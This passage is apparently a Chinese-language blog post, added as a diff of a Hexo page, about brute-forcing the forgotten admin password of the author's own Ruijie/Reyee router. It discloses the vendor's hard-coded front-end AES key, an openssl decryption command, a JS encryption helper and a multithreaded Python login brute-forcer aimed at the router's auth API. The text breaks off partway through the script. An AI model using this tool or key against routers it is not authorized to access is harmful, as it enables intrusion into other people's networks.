@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/image/favicons/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/image/favicons/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/image/favicons/favicon-16x16.png">
+  <link rel="mask-icon" href="/image/favicons/favicon.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"paoka1.top","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"always","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"default"},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":false,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="一次对锐捷路由后台密码的爆破，通过编写 Python 脚本发包，实现密码爆破，但本文采取的方法并不是最佳的方法 背景某次，忘记了路由后台的密码">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次对锐捷路由后台密码的爆破">
+<meta property="og:url" content="https://paoka1.top/2023/03/12/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E9%94%90%E6%8D%B7%E8%B7%AF%E7%94%B1%E5%90%8E%E5%8F%B0%E5%AF%86%E7%A0%81%E7%9A%84%E7%88%86%E7%A0%B4/index.html">
+<meta property="og:site_name" content="Paoka1&#39;s Blog">
+<meta property="og:description" content="一次对锐捷路由后台密码的爆破，通过编写 Python 脚本发包，实现密码爆破，但本文采取的方法并不是最佳的方法 背景某次，忘记了路由后台的密码">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/03/Reyee%E4%B8%BB%E7%95%8C%E9%9D%A2.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/03/Reyee%E6%8A%93%E5%8C%85.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/03/Reyee%E5%89%8D%E7%AB%AFJs%E5%8A%A0%E5%AF%86.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/03/AES%E5%8A%A0%E5%AF%86%E4%BB%A3%E7%A0%81.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/03/Gibberish_AES_Gh.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/03/%E8%8E%B7%E5%8F%96%E5%AF%86%E9%92%A5.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/03/AES%E8%A7%A3%E5%AF%86.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/03/%E8%8E%B7%E5%8F%96AES%E5%8A%A0%E5%AF%86.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/03/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%88%90%E5%8A%9F.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2023/03/%E8%BF%9B%E5%85%A5%E4%B8%BB%E9%A1%B5%E9%9D%A2.png">
+<meta property="article:published_time" content="2023-03-12T11:51:47.000Z">
+<meta property="article:modified_time" content="2026-01-04T12:44:32.423Z">
+<meta property="article:author" content="Paoka1">
+<meta property="article:tag" content="杂项">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://paoka1.top/image/post/2023/03/Reyee%E4%B8%BB%E7%95%8C%E9%9D%A2.png">
+
+
+<link rel="canonical" href="https://paoka1.top/2023/03/12/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E9%94%90%E6%8D%B7%E8%B7%AF%E7%94%B1%E5%90%8E%E5%8F%B0%E5%AF%86%E7%A0%81%E7%9A%84%E7%88%86%E7%A0%B4/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://paoka1.top/2023/03/12/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E9%94%90%E6%8D%B7%E8%B7%AF%E7%94%B1%E5%90%8E%E5%8F%B0%E5%AF%86%E7%A0%81%E7%9A%84%E7%88%86%E7%A0%B4/","path":"2023/03/12/记一次对锐捷路由后台密码的爆破/","title":"记一次对锐捷路由后台密码的爆破"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>记一次对锐捷路由后台密码的爆破 | Paoka1's Blog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.umd.js" integrity="sha256-a+H7FYzJv6oU2hfsfDGM2Ohw/cR9v+hPfxHCLdmCrE8=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js" defer></script>
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Paoka1's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome to my blog</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%83%8C%E6%99%AF"><span class="nav-number">1.</span> <span class="nav-text">背景</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E5%86%99%E8%84%9A%E6%9C%AC"><span class="nav-number">2.</span> <span class="nav-text">编写脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Paoka1"
+      src="/image/favicons/favicon.ico">
+  <p class="site-author-name" itemprop="name">Paoka1</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/paoka1" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;paoka1" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:shauio@163.com" title="E-Mail → mailto:shauio@163.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://paoka1.top/2023/03/12/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E9%94%90%E6%8D%B7%E8%B7%AF%E7%94%B1%E5%90%8E%E5%8F%B0%E5%AF%86%E7%A0%81%E7%9A%84%E7%88%86%E7%A0%B4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/image/favicons/favicon.ico">
+      <meta itemprop="name" content="Paoka1">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paoka1's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="记一次对锐捷路由后台密码的爆破 | Paoka1's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          记一次对锐捷路由后台密码的爆破
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-03-12 19:51:47" itemprop="dateCreated datePublished" datetime="2023-03-12T19:51:47+08:00">2023-03-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-01-04 20:44:32" itemprop="dateModified" datetime="2026-01-04T20:44:32+08:00">2026-01-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/" itemprop="url" rel="index"><span itemprop="name">安全相关</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>一次对锐捷路由后台密码的爆破，通过编写 Python 脚本发包，实现密码爆破，但本文采取的方法并不是最佳的方法</p>
+<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>某次，忘记了路由后台的密码</p>
+<p><img src="/image/post/2023/03/Reyee%E4%B8%BB%E7%95%8C%E9%9D%A2.png" alt="Reyee主界面"></p>
+<span id="more"></span>
+
+<p>看到只有密码栏，用户名可能是固定的，先抓一个登录包：</p>
+<p><img src="/image/post/2023/03/Reyee%E6%8A%93%E5%8C%85.png" alt="Reyee抓包"></p>
+<p>这里输入的密码是<code>123456</code>，可以看到密码被加密了，来看看前端是怎样加密的，发现这样一段 JavaScript 代码：</p>
+<p><img src="/image/post/2023/03/Reyee%E5%89%8D%E7%AB%AFJs%E5%8A%A0%E5%AF%86.png" alt="Reyee前端Js加密"></p>
+<p>跟踪到<code>GibberishAES.enc</code>函数：</p>
+<p><img src="/image/post/2023/03/AES%E5%8A%A0%E5%AF%86%E4%BB%A3%E7%A0%81.png" alt="AES加密代码"></p>
+<p>在 Gh 上找到了项目：</p>
+<p><img src="/image/post/2023/03/Gibberish_AES_Gh.png" alt="Gibberish_AES_Gh"></p>
+<p>作者给出了一种使用 openssl 解密的方法：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;xxx&quot; | openssl enc -d -aes-256-cbc -a -k key -md md5</span><br></pre></td></tr></table></figure>
+
+<p>关键在于拿到 key，而这不是难事：</p>
+<p><img src="/image/post/2023/03/%E8%8E%B7%E5%8F%96%E5%AF%86%E9%92%A5.png" alt="获取密钥"></p>
+<p>尝试来解密我们刚刚的密码：</p>
+<p><img src="/image/post/2023/03/AES%E8%A7%A3%E5%AF%86.png" alt="AES解密"></p>
+<blockquote>
+<p>这里由于使用了 AES 的 CBC 模式加密，相同明文加密而成的密文是不同的。另外，我在成功破解密码后，尝试去掉命令里的<code>-d</code>来通过正确的密码明文生成密文，但是提交后登录失败，具体原因未知</p>
+</blockquote>
+<h3 id="编写脚本"><a href="#编写脚本" class="headerlink" title="编写脚本"></a>编写脚本</h3><p>这里使用<code>selenium</code>启动浏览器运行加密密码的 JavaScript 来获取生成的密文：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./aes.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;para&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">getPar</span>(<span class="params">par</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> local_url = <span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> get = local_url.<span class="title function_">indexOf</span>(par + <span class="string">&quot;=&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (get == -<span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> get_par = local_url.<span class="title function_">slice</span>(par.<span class="property">length</span> + get + <span class="number">1</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> nextPar = get_par.<span class="title function_">indexOf</span>(<span class="string">&quot;&amp;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (nextPar != -<span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                get_par = get_par.<span class="title function_">slice</span>(<span class="number">0</span>, nextPar);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> get_par;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;para&quot;</span>).<span class="property">innerText</span> = <span class="title class_">GibberishAES</span>.<span class="title function_">enc</span>(<span class="title function_">getPar</span>(<span class="string">&quot;enc&quot;</span>), <span class="string">&quot;RjYkhwzx$2018!&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/\s+/g</span>, <span class="string">&#x27;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>其中<code>aes.js</code>为加密的脚本，与 HTML 同目录，使用 Python 启动一个 HTTP 服务，然后访问：</p>
+<p><img src="/image/post/2023/03/%E8%8E%B7%E5%8F%96AES%E5%8A%A0%E5%AF%86.png" alt="获取AES加密"></p>
+<p>然后写一个 Py 脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更改 ip</span></span><br><span class="line">attUrl = <span class="string">&quot;http://192.168.110.1/cgi-bin/luci/api/auth&quot;</span></span><br><span class="line">encUrl = <span class="string">&quot;http://127.0.0.1:8000&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_enc</span>(<span class="params">password: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    chrome_options = Options()</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--headless&#x27;</span>)</span><br><span class="line">    chrome_options.add_experimental_option(<span class="string">&#x27;excludeSwitches&#x27;</span>, [<span class="string">&#x27;enable-logging&#x27;</span>])</span><br><span class="line">    driver = webdriver.Chrome(options=chrome_options)</span><br><span class="line">    driver.get(encUrl + <span class="string">f&quot;/?enc=<span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">    password0 = re.findall(<span class="string">&#x27;\&lt;p id\=\&quot;para\&quot;\&gt;(.*)\&lt;\/p\&gt;&#x27;</span>, driver.page_source)</span><br><span class="line">    driver.close()</span><br><span class="line">    <span class="keyword">return</span> password0[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_att</span>(<span class="params">req_json: <span class="built_in">str</span>, timestamp: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">        <span class="comment"># 更改 ip</span></span><br><span class="line">        <span class="string">&quot;Referer&quot;</span>: <span class="string">f&quot;http://192.168.110.1/cgi-bin/luci/?stamp=<span class="subst">&#123;timestamp&#125;</span>&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;__APP_LANG__=en&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(attUrl, data=req_json, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> json.loads(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">res_print</span>(<span class="params">res: <span class="built_in">str</span>, password: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">if</span> res[<span class="string">&quot;code&quot;</span>] == <span class="number">0</span> <span class="keyword">and</span> res[<span class="string">&quot;id&quot;</span>] == <span class="literal">None</span> <span class="keyword">and</span> res[<span class="string">&quot;data&quot;</span>] == <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># print(f&quot;&#123;password&#125; is Failed&quot;)</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;=-=-=-= Attention To <span class="subst">&#123;password&#125;</span> =-=-=-=&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>(<span class="params">filename: <span class="built_in">str</span></span>) -&gt; <span class="built_in">list</span>:</span><br><span class="line">    passwords = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file=filename, mode=<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            passwords.append(line.split()[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> passwords</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">job</span>(<span class="params">password: <span class="built_in">str</span>, thread_limit: threading.Semaphore</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    thread_limit.acquire()</span><br><span class="line">    password0 = get_enc(password)</span><br><span class="line">    time0 = <span class="built_in">str</span>(<span class="built_in">int</span>(time.time()))</span><br><span class="line">    req_raw = &#123;<span class="string">&quot;method&quot;</span>: <span class="string">&quot;login&quot;</span>, <span class="string">&quot;params&quot;</span>: &#123;<span class="string">&quot;password&quot;</span>: password0, <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;time&quot;</span>: time0, <span class="string">&quot;encry&quot;</span>: <span class="literal">True</span>, <span class="string">&quot;limit&quot;</span>: <span class="literal">False</span>&#125;&#125;</span><br><span class="line">    req_json = json.dumps(req_raw)</span><br><span class="line">    res = get_att(req_json, time0)</span><br><span class="line">    res_print(res, password)</span><br><span class="line">    thread_limit.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">job_start</span>(<span class="params">filename: <span class="built_in">str</span>, thread: <span class="built_in">int</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    passwords = read_file(filename)</span><br><span class="line">    thread_limit = threading.Semaphore(thread)</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> passwords:</span><br><span class="line">        <span class="comment"># print(f&quot;Try password: &#123;p&#125;&quot;)</span></span><br><span class="line">        t = threading.Thread(target=job, args=(p, thread_limit))</span><br><span class="line">        t.start()</span><br><span class="line">    t.join()</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n!!! ALL DOWN !!!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span 